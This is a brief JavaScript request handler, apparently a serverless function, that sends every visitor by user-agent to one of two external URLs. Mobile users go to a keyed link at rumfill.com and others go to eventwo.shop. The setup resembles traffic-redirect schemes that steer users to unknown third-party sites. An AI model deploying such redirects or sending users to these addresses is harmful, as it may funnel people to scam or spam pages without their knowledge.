export async function onRequest(context) {
  const ua = (context.request.headers.get("user-agent") || "").toLowerCase();

  const mobileURL = "https://rumfill.com/jtdyzwx9dp?key=6ceffee47be217154eecc6045d5bb044";
  const desktopURL = "https://eventwo.shop/ipo0/";

  const isMobile = /android|iphone|ipad|ipod|mobile|tablet/.test(ua);

  if (isMobile) {
    return Response.redirect(mobileURL, 302);
  }

  return Response.redirect(desktopURL, 302);
}
